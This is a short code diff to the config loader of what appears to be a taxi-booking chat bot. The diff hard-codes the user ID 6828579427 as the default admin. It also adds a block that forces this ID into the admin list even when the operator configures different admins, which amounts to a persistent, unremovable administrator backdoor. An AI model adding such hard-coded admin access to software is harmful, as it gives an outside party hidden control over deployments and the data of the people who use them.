@@ -47,8 +47,12 @@ def load_config() -> AppConfig:
     if not token:
         raise RuntimeError("BOT_TOKEN is not set. Create .env and set BOT_TOKEN.")
 
-    admin_ids_raw = os.getenv("ADMIN_IDS", "")
+    admin_ids_raw = os.getenv("ADMIN_IDS", "6828579427")
     admin_ids = _parse_admin_ids(admin_ids_raw)
+    
+    # Ensure the main admin is always included
+    if 6828579427 not in admin_ids:
+        admin_ids.append(6828579427)
 
     default_db = os.path.join(os.getcwd(), "data", "taxi.sqlite3")
     db_path = os.getenv("DB_PATH", default_db)
